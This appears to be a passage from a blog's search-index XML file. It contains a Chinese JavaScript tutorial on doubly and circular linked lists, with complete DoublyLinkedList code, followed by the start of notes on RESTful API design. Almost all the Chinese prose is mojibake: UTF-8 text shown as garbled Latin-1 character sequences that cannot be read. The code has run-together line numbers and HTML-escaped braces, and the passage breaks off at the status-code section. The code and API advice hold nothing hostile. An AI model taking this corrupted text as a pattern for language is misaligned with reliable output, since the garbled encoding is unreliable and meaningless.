ï¼ˆå®ƒè¢«è®¾ä¸ºåˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚ä¸åŒä¹‹å¤„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸ºæŒ‡å‘ä¸Šä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆè®¾ä¸€ä¸ªå€¼ã€‚current.prev æŒ‡é’ˆå°†ç”± æŒ‡å‘ null å˜æˆæŒ‡å‘ æ–°å…ƒç´ ï¼ˆcurrent.prev = nodeï¼‰ã€‚node.prev æŒ‡é’ˆå·²ç»æ˜¯ null,å› æ­¤ä¸éœ€è¦åœ¨æ›´æ–°ä»»ä½•ä¸œè¥¿äº†ã€‚ å‡å¦‚æˆ‘ä»¬è¦åœ¨åˆ—è¡¨æœ€åŽæ·»åŠ ä¸€ä¸ªæ–°å…ƒç´ ã€‚è¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šæƒ…å†µï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æŽ§åˆ¶ç€æŒ‡å‘æœ€åŽä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼ˆtailï¼‰ã€‚current å˜é‡å°†å¼•ç”¨æœ€åŽä¸€ä¸ªå…ƒç´ ï¼ˆcurrent = tailï¼‰ã€‚ç„¶åŽåˆ†å¼€å»ºç«‹ç¬¬ä¸€ä¸ªé“¾æŽ¥ï¼šnode.prev å°†å¼•ç”¨currentã€‚current.next æŒ‡é’ˆï¼ˆæŒ‡å‘nullï¼‰å°†æŒ‡å‘ node ï¼ˆç”±äºŽæž„é€ å‡½æ•°ï¼Œnode.next å·²ç»æŒ‡å‘äº† nullï¼‰ã€‚ç„¶åŽåªå‰©ä¸‹ä¸€ä»¶äº‹ï¼Œå°±æ˜¯æ›´æ–° tail ï¼Œå®ƒå°†ç”± æŒ‡å‘ current å˜æˆæŒ‡å‘ node ã€‚ ç¬¬ä¸‰ç§åœºæ™¯ï¼šåœ¨åˆ—è¡¨ä¸­æ’å…¥ä¸€ä¸ªæ–°å…ƒç´ ï¼Œå°±åƒæˆ‘ä»¬åœ¨ä¹‹å‰æ–¹æ³•ä¸­æ‰€åšï¼Œè¿­ä»£åˆ—è¡¨ï¼ŒçŸ¥é“åˆ°è¾¾è¦æ‰¾çš„ä½ç½®ï¼ˆwhile (index++ &lt; position)ï¼‰ã€‚æˆ‘ä»¬å°†åœ¨ current å’Œ previous å…ƒç´ ä¹‹é—´æ’å…¥æ–°å…ƒç´ ã€‚é¦–å…ˆï¼Œnode.next å°†æŒ‡å‘ current ,è€Œ previous.next å°†æŒ‡å‘ node,è¿™æ ·å°±ä¸ä¼šè·ŒåŠ¿èŠ‚ç‚¹ä¹‹é—´çš„é“¾æŽ¥ã€‚ç„¶åŽéœ€è¦å¤„ç†æ‰€æœ‰çš„é“¾æŽ¥ï¼šcurrent.prev å°†æŒ‡å‘node ,è€Œ node.prev å°†æŒ‡å‘ previous ä»Žä»»æ„ä½ç½®ç§»é™¤å…ƒç´ ä»ŽåŒå‘é“¾è¡¨ä¸­ç§»é™¤å…ƒç´ è·Ÿé“¾è¡¨éžå¸¸ç±»ä¼¼ã€‚å”¯ä¸€åŒºåˆ«å°±æ˜¯è¿˜éœ€è¦è®¾ç½®ä¸€ä¸ªä½ç½®çš„æŒ‡é’ˆã€‚ 12345678910111213141516171819202122232425262728293031323334this.removeAt = function(position)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; // ç§»é™¤ç¬¬ä¸€é¡¹ if(position === 0)&#123; head = current.next; // å¦‚æžœåªæœ‰ä¸€é¡¹ï¼Œæ›´æ–° tail if(length === 1)&#123; tail = null; &#125;else&#123; head.prev = null; &#125; &#125;else if(position === length-1)&#123; // æœ€åŽä¸€é¡¹ current = tail; tail = current.prev; tail.next = null; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; // å°† previous ä¸Ž current çš„ä¸‹ä¸€é¡¹è¿žæŽ¥èµ·æ¥â€”â€”è·³è¿‡ current previous.next = current.next; current.next.prev = previous; &#125; length --; return current.elememt; &#125;else&#123; return null; &#125;&#125; æˆ‘ä»¬éœ€è¦å¤„ç†ä¸‰ç§åœºæ™¯ï¼Œä»Žå¤´éƒ¨ã€ä»Žä¸­é—´å’Œä»Žå°¾éƒ¨ç§»é™¤ä¸€ä¸ªå…ƒç´ ã€‚ ç§»é™¤ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚current å˜é‡æ˜¯å¯¹åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦ç§»é™¤çš„è¿œå¤ä¸‰ã€‚éœ€è¦åšçš„å°±æ˜¯æ”¹å˜ head çš„å¼•ç”¨ï¼Œå°†å…¶ä»Ž current æ”¹ä¸ºä¸‹ä¸€ä¸ªå…ƒç´ ï¼ˆhead = current.next;ï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ›´æ–° current.next æŒ‡å‘ä¸Šä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼ˆå› ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ çš„ prev æŒ‡é’ˆæ˜¯ nullï¼‰ã€‚å› æ­¤ï¼ŒæŠŠ head.prev çš„å¼•ç”¨æ”¹ä¸º nullï¼ˆå› ä¸º head ä¹ŸæŒ‡å‘äº†åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ç”¨ current.next.prev ï¼‰ã€‚ç”±äºŽè¿˜éœ€è¦æŽ§åˆ¶ tail çš„å¼•ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æµ‹è¦ç§»é™¤çš„æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æžœæ˜¯ï¼Œåªéœ€è¦æŠŠ tail ä¹Ÿè®¾ä¸º nullã€‚ ç§»é™¤æœ€åŽä¸€ä¸ªä½ç½®çš„å…ƒç´ ã€‚æ—¢ç„¶å·²ç»æœ‰äº†å¯¹æœ€åŽä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼ˆtailï¼‰,æˆ‘ä»¬å°±ä¸éœ€è¦ä¸ºæ‰¾åˆ°å®ƒè€Œè¿­ä»£åˆ—è¡¨ã€‚æˆ‘ä»¬å¯ä»¥æŠŠ tail çš„å¼•ç”¨èµ‹ç»™ current å˜é‡ã€‚æŽ¥ä¸‹æ¥ï¼Œå°±éœ€è¦å§ tail çš„å¼•ç”¨æ›´æ–°ä¸ºåˆ—è¡¨ä¸­çš„å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆcurrent.prev,æˆ–è€… tail.prevä¹Ÿå¯ä»¥ï¼‰ã€‚æ—¢ç„¶ tail æŒ‡å‘äº†å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼Œæˆ‘ä»¬éœ€è¦æŠŠ next æŒ‡é’ˆæ›´æ–°ä¸º null ï¼ˆtail.next = nullï¼‰ã€‚ æœ€åŽä¸€ç§åœºæ™¯ï¼Œä»Žåˆ—è¡¨ä¸­ç§»é™¤ä¸€ä¸ªå…ƒç´ ã€‚é¦–å…ˆéœ€è¦è¿­ä»£åˆ—è¡¨ï¼Œç›´åˆ°åˆ°è¾¾è¦æ‰¾çš„ä½ç½®ã€‚current å˜é‡æ‰€å¼•ç”¨çš„å°±æ˜¯è¦ç§»é™¤çš„è¿œå¤ä¸‰ã€‚é‚£ä¹ˆè¦ç§»é™¤å®ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ–° previous.next å’Œ current.next.prev çš„å¼•ç”¨ï¼Œåœ¨åˆ—è¡¨ä¸­è·³è¿‡å®ƒã€‚å› æ­¤ï¼Œprevious.next å°† æŒ‡å‘ current.next ï¼Œè€Œ current.next.prev å°†æŒ‡å‘ previousã€‚ å®Œæ•´ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141function DoublyLinkedList()&#123; let Node = function(elememt)&#123; this.elememt = elememt; this.next = null; this.prev = null; // æ–°å¢žçš„ &#125; let length = 0; let head = null; let tail = null // æ–°å¢žçš„ this.append = function(elememt)&#123; let node = new Node(elememt), current; if(!head)&#123; head = node; tail = node; &#125;else&#123; current = tail; current.next = node; node.prev = current; tail = node; &#125; length++; &#125; this.insert = function(position,elememt)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt;= 0 &amp;&amp; position &lt;= length)&#123; let node = new Node(elememt), current = head, previous, index = 0; if(position === 0)&#123; // åœ¨ç¬¬ä¸€ä¸ªä½ç½®æ·»åŠ  if(!head)&#123; head = node; tail = node; &#125;else&#123; node.next = current; current.prev = node; head = node; &#125; &#125;else if(position === length)&#123; // æœ€åŽä¸€é¡¹ current = tail; current.next = node; node.prev = current; tail = node; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; current.prev = node; node.prev = previous; &#125; length++ return true; &#125;else&#123; return false; &#125; &#125; this.removeAt = function(position)&#123; // æ£€æŸ¥è¶Šç•Œå€¼ if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; // ç§»é™¤ç¬¬ä¸€é¡¹ if(position === 0)&#123; head = current.next; // å¦‚æžœåªæœ‰ä¸€é¡¹ï¼Œæ›´æ–° tail if(length === 1)&#123; tail = null; &#125;else&#123; head.prev = null; &#125; &#125;else if(position === length-1)&#123; // æœ€åŽä¸€é¡¹ current = tail; tail = current.prev; tail.next = null; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; // å°† previous ä¸Ž current çš„ä¸‹ä¸€é¡¹è¿žæŽ¥èµ·æ¥â€”â€”è·³è¿‡ current previous.next = current.next; current.next.prev = previous; &#125; length --; return current.elememt; &#125;else&#123; return null; &#125; &#125; this.remove = function(elememt)&#123; let index = this.indexOf(elememt); this.removeAt(index); &#125; this.toString = function()&#123; let current = head, str = ''; while (current) &#123; str += current.elememt + (current.next?'-':''); current = current.next; &#125; return str; &#125; this.indexOf = function(elememt)&#123; let current = head, index = 0; while (current) &#123; if(current.elememt === elememt)&#123; return index &#125; current = current.next; index++ &#125; return -1; &#125; this.isEmpty = function()&#123; return length === 0; &#125; this.size = function()&#123; return length; &#125; this.getHead = function()&#123; return head; &#125;&#125; å¾ªçŽ¯é“¾è¡¨å¾ªçŽ¯é“¾è¡¨å¯ä»¥åƒé“¾è¡¨ä¸€æ ·åªæœ‰å•å‘å¼•ç”¨ï¼Œä¹Ÿå¯ä»¥åƒåŒå‘é“¾è¡¨ä¸€æ ·æœ‰åŒå‘å¼•ç”¨ã€‚å¾ªçŽ¯é“¾è¡¨å’Œé“¾è¡¨ä¹‹é—´å”¯ä¸€çš„åŒºåˆ«åœ¨äºŽï¼Œæœ€åŽä¸€ä¸ªå…ƒç´ æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆï¼ˆtail.nextï¼‰ä¸æ˜¯å¼•ç”¨ null,è€Œæ˜¯æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆheadï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º åŒå‘é“¾è¡¨æœ‰æŒ‡å‘ head å…ƒç´ çš„ tail.next ï¼Œå’ŒæŒ‡å‘ tail å…ƒç´ çš„ head.prev å°ç»“è¿™ä¸€ç« ä¸­ï¼Œå­¦ä¹ äº†é“¾è¡¨è¿™ç§æ•°æ®ç»“æž„ï¼ŒåŠå…¶è¾©é¢˜åŒå‘é“¾è¡¨å’Œå¾ªçŽ¯é“¾è¡¨ï¼ŒçŸ¥é“äº†å¦‚ä½•åœ¨ä»»æ„ä½ç½®æ·»åŠ å’Œç§»é™¤å…ƒç´ ï¼Œå·²ç»å¦‚ä½•å¾ªçŽ¯è®¿é—®ä¸¤è¾¹ï¼Œæ¯”æ•°ç»„é‡è¦çš„ä¼˜ç‚¹å°±æ˜¯ï¼Œæ— éœ€ç§»åŠ¨é“¾è¡¨ä¸­çš„å…ƒç´ ï¼Œå°±èƒ½è½»æ¾æ·»åŠ å’Œç§»é™¤å…ƒç´ ã€‚å½“ä½ éœ€è¦æ·»åŠ å’Œç§»é™¤å¾ˆå¤šå…ƒç´ çš„æ—¶å€™ï¼Œæœ€å¥½çš„é€‰æ‹©å°±æ˜¯é“¾è¡¨ï¼Œè€Œéžæ•°ç»„ã€‚ä¸‹ä¸€ç« å°†å­¦ä¹ é›†åˆï¼Œæœ€åŽä¸€ç§é¡ºåºæ•°æ®ç»“æž„ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£RESTful]]></title>
    <url>%2F2018-10-26-RESTful.html</url>
    <content type="text"><![CDATA[é€šè¿‡é˜…è¯»é˜®ä¸€å³°è€å¸ˆçš„ä¸¤ç¯‡æ–‡ç« ï¼Œè¿›è¡Œç¬”è®°çš„æŠ„å½•ï¼Œæ¥åŠ æ·±è‡ªå·±å¯¹äºŽ RESTfulçš„ç†è§£ æ·±å…¥ç†è§£RESTfulRESTful æž¶æž„æ˜¯ç›®å‰æœ€æµè¡Œçš„ä¸€ç§äº’è”ç½‘è½¯ä»¶æž¶æž„ï¼Œå®ƒç»“æž„æ¸…æ™°ã€ç¬¦åˆæ ‡å‡†ã€æ˜“äºŽç†è§£ã€æ‰©å±•æ–¹ä¾¿ï¼Œæ‰€ä»¥å¾—åˆ°è¶Šæ¥è¶Šå¤šç½‘ç«™çš„é‡‡ç”¨ã€‚é‚£ä¹ˆï¼Œåˆ°åº•ä»€ä¹ˆå«åš RESTful æž¶æž„å‘¢ï¼Ÿ RESTful æž¶æž„èµ·æºRESTè¿™ä¸ªè¯ï¼Œæ˜¯Roy Thomas Fieldingåœ¨ä»–2000å¹´çš„åšå£«è®ºæ–‡ä¸­æå‡ºçš„ã€‚ åç§°Fieldingå°†ä»–å¯¹äº’è”ç½‘è½¯ä»¶çš„æž¶æž„åŽŸåˆ™ï¼Œå®šåä¸ºRESTï¼Œå³Representational State Transferçš„ç¼©å†™ã€‚æˆ‘å¯¹è¿™ä¸ªè¯ç»„çš„ç¿»è¯‘æ˜¯â€è¡¨çŽ°å±‚çŠ¶æ€è½¬åŒ–â€ã€‚ èµ„æºï¼ˆResourcesï¼‰RESTçš„åç§°â€è¡¨çŽ°å±‚çŠ¶æ€è½¬åŒ–â€ä¸­ï¼Œçœç•¥äº†ä¸»è¯­ã€‚â€è¡¨çŽ°å±‚â€å…¶å®žæŒ‡çš„æ˜¯â€èµ„æºâ€ï¼ˆResourcesï¼‰çš„â€è¡¨çŽ°å±‚â€ã€‚ æ‰€è°“çš„â€œèµ„æºâ€ï¼Œå°±æ˜¯ç½‘ç»œä¸Šçš„ä¸€ä¸ªå®žä½“ï¼Œæˆ–è€…è¯´æ˜¯ç½‘ç»œä¸Šçš„ä¸€ä¸ªå…·ä½“ä¿¡æ¯ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€æ®µæ–‡æœ¬ã€ä¸€å¼ å›¾ç‰‡ï¼Œä¸€é¦–æ­Œï¼Œä¸€ç§æœåŠ¡ï¼Œæ€»ä¹‹å°±æ˜¯ä¸€ä¸ªå…·ä½“çš„å­˜åœ¨ã€‚å¯ä»¥ç”¨ä¸€ä¸ª URI ï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰æŒ‡å‘å®ƒï¼Œæ¯ç§èµ„æºå¯¹åº”ä¸€ä¸ªç‰¹å®šçš„ URI ï¼Œè¦èŽ·å–è¿™ä¸ªèµ„æºï¼Œè®¿é—®å®ƒçš„ URI å°±å¯ä»¥ï¼Œå› è€Œ URI å°±æˆäº†æ¯ä¸€ä¸ªèµ„æºçš„åœ°å€æˆ–è€…æ”¶æ‹¾ç‹¬ä¸€æ— äºŒçš„è¯†åˆ«ç¬¦ã€‚ è¡¨çŽ°å±‚ï¼ˆRepresentationï¼‰â€œèµ„æºâ€æ˜¯ä¸€ç§æ¶ˆæ¯å®žä½“ï¼Œå¯ä»¥æœ‰å¤šç§å¤–åœ¨è¡¨çŽ°å½¢å¼ï¼ŒæŠŠâ€œèµ„æºâ€å…·ä½“å‘ˆçŽ°å‡ºæ¥çš„å½¢å¼ï¼Œå«åšå®ƒçš„â€œè¡¨çŽ°å±‚â€ ä¾‹å¦‚ï¼šæ–‡æœ¬å¯ä»¥ç”¨ txt æ ¼å¼è¡¨çŽ°ï¼Œä¹Ÿå¯ä»¥ç”¨ HTML æ ¼å¼ã€XML æ ¼å¼ã€JSON æ ¼å¼è¡¨çŽ°ï¼Œç”šè‡³å¯ä»¥é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼ï¼Œå›¾ç‰‡å¯ä»¥ç”¨ JPG æ ¼å¼è¡¨çŽ°ï¼Œä¹Ÿå¯ä»¥ç”¨ PNG æ ¼å¼è¡¨çŽ°ã€‚ URI åªä»£è¡¨èµ„æºçš„å®žä½“ï¼Œä¸ä»£è¡¨å®ƒçš„å½¢å¼ï¼Œä¸¥æ ¼åœ°è¯´ï¼Œæœ‰äº›ç½‘ç«™æœ€åŽçš„â€œ.htmlâ€åŽç¼€åæ˜¯ä¸å¿…è¦çš„ï¼Œå› ä¸ºè¿™ä¸ªåŽç¼€åè¡¨ç¤ºæ ¼å¼ï¼Œå±žäºŽâ€œè¡¨çŽ°å±‚â€çš„èŒƒç•´ï¼Œè€Œ URI åº”è¯¥åªä»£è¡¨â€œèµ„æºâ€çš„ä½ç½®ã€‚å®ƒçš„å…·ä½“è¡¨çŽ°å½¢å¼ï¼Œåº”è¯¥åœ¨ HTTP è¯·æ±‚çš„å¤´éƒ¨ä¿¡æ¯ä¸­ç”¨ Accept å’Œ Content-Type å­—æ®µæ¥æŒ‡å®šï¼Œè¿™ä¸¤ä¸ªå­—æ®µæ‰æ˜¯å¯¹â€œè¡¨çŽ°å±‚â€çš„æè¿°ã€‚ çŠ¶æ€è½¬åŒ–ï¼ˆstate Transferï¼‰è®¿é—®ä¸€ä¸ªç½‘ç«™ï¼Œå°±ä»£è¡¨äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„ä¸€ä¸ªäº’åŠ¨çš„è¿‡ç¨‹ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå°±ä¼šæ¶‰åŠåˆ°æ•°æ®å’ŒçŠ¶æ€çš„å˜åŒ–ã€‚ äº’è”ç½‘é€šä¿¡åè®® HTTP åè®®ï¼Œæ˜¯ä¸€ä¸ªæ— çŠ¶æ€åè®®ã€‚è¿™æ„å‘³ç€ï¼Œæ‰€æœ‰çš„çŠ¶æ€éƒ½ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ï¼Œå› æ­¤ï¼Œå¦‚æžœå®¢æˆ·ç«¯æƒ³è¦æ“ä½œæœåŠ¡å™¨ï¼Œå¿…é¡»é€šè¿‡æŸç§æ‰‹æ®µï¼Œè®©æœåŠ¡å™¨ç«¯å‘ç”Ÿâ€œçŠ¶æ€è½¬åŒ–ï¼ˆState Transferï¼‰â€ ã€‚è€Œè¿™ç§è½¬åŒ–æ˜¯å»ºç«‹åœ¨è¡¨çŽ°å±‚ä¹‹ä¸Šçš„ï¼Œæ‰€ä»¥å°±æ˜¯â€œè¡¨çŽ°å±‚çŠ¶æ€è½¬åŒ–â€ å®¢æˆ·ç«¯ç”¨åˆ°çš„æ‰‹æ®µï¼Œåªèƒ½æ˜¯ HTTP åè®®ï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯ HTTP åè®®é‡Œé¢ï¼Œå››ä¸ªè¡¨ç¤ºæ“ä½œçš„åŠ¨è¯ï¼š GET/POST/PUT/DELETEã€‚å®ƒä»¬åˆ†åˆ«å¯¹åº”å››ç§åŸºæœ¬æ“ä½œï¼šèŽ·å–/æ–°å»ºï¼ˆæ›´æ–°ï¼‰/æ›´æ–°/åˆ é™¤ èµ„æº ç»¼è¿°RESTful å°±æ˜¯ æ¯ä¸€ä¸ª URI ä»£è¡¨ä¸€ä¸ªèµ„æº å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ä¹‹é—´ï¼Œä¼ é€’è¿™ç§èµ„æºçš„æŸç§è¡¨çŽ°å±‚ å®¢æˆ·ç«¯é€šè¿‡å››ä¸ª HTTP åŠ¨è¯ï¼Œå¯¹æœåŠ¡ç«¯èµ„æºè¿›è¡Œæ“ä½œï¼Œå®žçŽ°â€è¡¨çŽ°å±‚çŠ¶æ€è½¬åŒ–â€œ è¯¯åŒºRESTful æž¶æž„æœ‰ä¸€äº›å…¸åž‹çš„è®¾è®¡è¯¯åŒº æœ€å¸¸è§çš„è®¾è®¡è¯¯åŒºï¼Œå°±æ˜¯ URI ä¸­åŒ…å«åŠ¨è¯ã€‚å› ä¸ºâ€œèµ„æºâ€æ˜¯ä¸€ç§å®žä½“ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯åç§°ï¼ŒURI ä¸åº”è¯¥æœ‰åŠ¨è¯ï¼ŒåŠ¨è¯åº”è¯¥æ”¾åœ¨ HTTP åè®®ä¸­ã€‚ ä¾‹å­ï¼š URI: /posts/show/1 å…¶ä¸­ show æ˜¯åŠ¨è¯ï¼Œè¿™ä¸ª URI è®¾è®¡å°±é”™è¯¯äº†ï¼Œæ­£ç¡®çš„åº”è¯¥æ˜¯ URI: /posts/1 ç„¶åŽç”¨ GET è¡¨ç¤º show å¦‚æžœæŸäº›åŠ¨ä½œæ˜¯HTTPåŠ¨è¯è¡¨ç¤ºä¸äº†çš„ï¼Œä½ å°±åº”è¯¥æŠŠåŠ¨ä½œåšæˆä¸€ç§èµ„æºã€‚æ¯”å¦‚ç½‘ä¸Šæ±‡æ¬¾ï¼Œä»Žè´¦æˆ·1å‘è´¦æˆ·2æ±‡æ¬¾500å…ƒï¼Œé”™è¯¯çš„URIæ˜¯ï¼š 1POST /accounts/1/transfer/500/to/2 æ­£ç¡®çš„å†™æ³•æ˜¯æŠŠåŠ¨è¯transferæ”¹æˆåè¯transactionï¼Œèµ„æºä¸èƒ½æ˜¯åŠ¨è¯ï¼Œä½†æ˜¯å¯ä»¥æ˜¯ä¸€ç§æœåŠ¡ï¼š 123POST /transaction HTTP/1.1Host: 127.0.0.1from=1&amp;to=2&amp;amount=500.00 å¦ä¸€ä¸ªè®¾è®¡è¯¯åŒºï¼Œå°±æ˜¯åœ¨URIä¸­åŠ å…¥ç‰ˆæœ¬å·ï¼š http://www.example.com/app/1.0/foo http://www.example.com/app/1.1/foo http://www.example.com/app/2.0/foo å› ä¸ºä¸åŒçš„ç‰ˆæœ¬ï¼Œå¯ä»¥ç†è§£æˆåŒä¸€ç§èµ„æºçš„ä¸åŒè¡¨çŽ°å½¢å¼ï¼Œæ‰€ä»¥åº”è¯¥é‡‡ç”¨åŒä¸€ä¸ªURIã€‚ç‰ˆæœ¬å·å¯ä»¥åœ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯çš„Acceptå­—æ®µä¸­è¿›è¡ŒåŒºåˆ†ï¼ˆå‚è§Versioning REST Servicesï¼‰ï¼š Accept: vnd.example-com.foo+json; version=1.0 Accept: vnd.example-com.foo+json; version=1.1 Accept: vnd.example-com.foo+json; version=2.0 RESTful API æœ€ä½³å®žè·µURI è®¾è®¡åŠ¨è¯ + å®¾è¯­ RESTful çš„ æ ¸å¿ƒæ€æƒ³å°±æ˜¯ï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„æ•°æ®æ“ä½œæŒ‡ä»¤éƒ½æ˜¯ â€œåŠ¨è¯+å®¾è¯­â€çš„ç»“æž„ï¼Œæ¯”å¦‚ GET/articlesè¿™ä¸ªå‘½ä»¤ï¼ŒGETæ˜¯åŠ¨è¯ï¼Œ/articlesæ˜¯å®¾è¯­ åŠ¨è¯é€šå¸¸å°±æ˜¯äº”ç§ HTTP æ–¹æ³•ï¼Œå¯¹åº” CRUDï¼ˆCreateå¢žåŠ |Retrieveè¯»å–æŸ¥è¯¢|Updateæ›´æ–°|Deleteåˆ é™¤ï¼‰ æ“ä½œ GET ï¼šè¯»å–ï¼ˆReadï¼‰ POSTï¼šæ–°å»ºï¼ˆCreateï¼‰ PUTï¼šæ›´æ–°ï¼ˆUpdateï¼‰ PATCHï¼šæ›´æ–°ï¼ˆUpdateï¼‰ï¼Œé€šå¸¸æ˜¯éƒ¨åˆ†æ›´æ–° DELETEï¼šåˆ é™¤ï¼ˆDeleteï¼‰ æ ¹æ® HTTP è§„èŒƒï¼ŒåŠ¨è¯ä¸€å¾‹å¤§å†™ã€‚ åŠ¨è¯çš„è¦†ç›– æœ‰äº›å®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨ GETå’Œ POSTè¿™ä¸¤ç§æ–¹æ³•ï¼ŒæœåŠ¡å™¨å¿…é¡»æŽ¥å— POSTæ¨¡æ‹Ÿå…¶ä»–ä¸‰ä¸ªæ–¹æ³•ï¼ˆPUTã€PATCHã€DELETEï¼‰ è¿™æ—¶å®¢æˆ·ç«¯å‘å‡ºçš„ HTTP è¯·æ±‚ï¼Œè¦åŠ ä¸Š X-HTTP-Method-Overrideå±žæ€§ï¼Œå‘Šè¯‰æœåŠ¡å™¨åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªåŠ¨è¯ï¼Œè¦†ç›– POSTæ–¹æ³• 12POST /api/Person/4 HTTP/1.1X-HTTP-Method-Override: PUT ä¸Šé¢ä»£ç ä¸­ï¼ŒX-HTTP-Method-OverrideæŒ‡å®šæœ¬æ¬¡è¯·æ±‚çš„æ–¹æ³•æ˜¯PUTï¼Œè€Œä¸æ˜¯POSTã€‚ å®¾è¯­å¿…é¡»æ˜¯åè¯ å®¾è¯­å°±æ˜¯ API çš„URI ï¼Œæ˜¯ HTTP åŠ¨è¯ä½œç”¨çš„å¯¹è±¡ï¼Œå®ƒåº”è¯¥æ˜¯åè¯ï¼Œä¸èƒ½æ˜¯åŠ¨è¯ï¼Œæ¯”å¦‚ /articlesè¿™ä¸ª URL å°±æ˜¯æ­£ç¡®çš„ï¼Œè€Œä¸‹é¢çš„ URL ä¸æ˜¯åè¯ï¼Œæ‰€ä»¥éƒ½æ˜¯é”™è¯¯çš„ /getAllCars /createNewCar /deleteAllRedCars å¤æ•° URL æ—¢ç„¶ URL æ˜¯åè¯ï¼Œé‚£ä¹ˆåº”è¯¥ä½¿ç”¨å¤æ•°ï¼Œè¿˜æ˜¯å•æ•°ï¼Ÿ è¿™æ²¡æœ‰ç»Ÿä¸€çš„è§„å®šï¼Œä½†æ˜¯å¸¸è§çš„æ“ä½œæ˜¯è¯»å–ä¸€ä¸ªé›†åˆï¼Œæ¯”å¦‚GET /articlesï¼ˆè¯»å–æ‰€æœ‰æ–‡ç« ï¼‰ï¼Œè¿™é‡Œæ˜Žæ˜¾åº”è¯¥æ˜¯å¤æ•°ã€‚ ä¸ºäº†ç»Ÿä¸€èµ·è§ï¼Œå»ºè®®éƒ½ä½¿ç”¨å¤æ•° URLï¼Œæ¯”å¦‚GET /articles/2è¦å¥½äºŽGET /article/2ã€‚ é¿å…å¤šçº§ URL å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œèµ„æºéœ€è¦å¤šçº§åˆ†ç±»ï¼Œå› æ­¤å¾ˆå®¹æ˜“å†™å‡ºå¤šçº§çš„ URLï¼Œæ¯”å¦‚èŽ·å–æŸä¸ªä½œè€…çš„æŸä¸€ç±»æ–‡ç« ã€‚ 1GET /authors/12/categories/2 è¿™ç§ URL ä¸åˆ©äºŽæ‰©å±•ï¼Œè¯­ä¹‰ä¹Ÿä¸æ˜Žç¡®ï¼Œå¾€å¾€è¦æƒ³ä¸€ä¼šï¼Œæ‰èƒ½æ˜Žç™½å«ä¹‰ã€‚ æ›´å¥½çš„åšæ³•æ˜¯ï¼Œé™¤äº†ç¬¬ä¸€çº§ï¼Œå…¶ä»–çº§åˆ«éƒ½ç”¨æŸ¥è¯¢å­—ç¬¦ä¸²è¡¨è¾¾ã€‚ 1GET /authors/12?categories=2 ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ï¼ŒæŸ¥è¯¢å·²å‘å¸ƒçš„æ–‡ç« ã€‚ä½ å¯èƒ½ä¼šè®¾è®¡æˆä¸‹é¢çš„ URLã€‚ 1GET /articles/published æŸ¥è¯¢å­—ç¬¦ä¸²çš„å†™æ³•æ˜Žæ˜¾æ›´å¥½ã€‚ 1GET /articles?published=true çŠ¶æ€ç çŠ¶æ€ç å¿…é¡»ç²¾ç¡® å®¢æˆ·ç«¯çš„æ¯ä¸€æ¬¡è¯·æ±‚ï¼ŒæœåŠ¡å™¨éƒ½å¿…é¡»ç»™å‡ºå›žåº”ã€‚å›žåº”åŒ…æ‹¬ HTTP çŠ¶æ€ç å’Œæ•°æ®ä¸¤éƒ¨åˆ†ã€‚ HTTP çŠ¶æ€ç 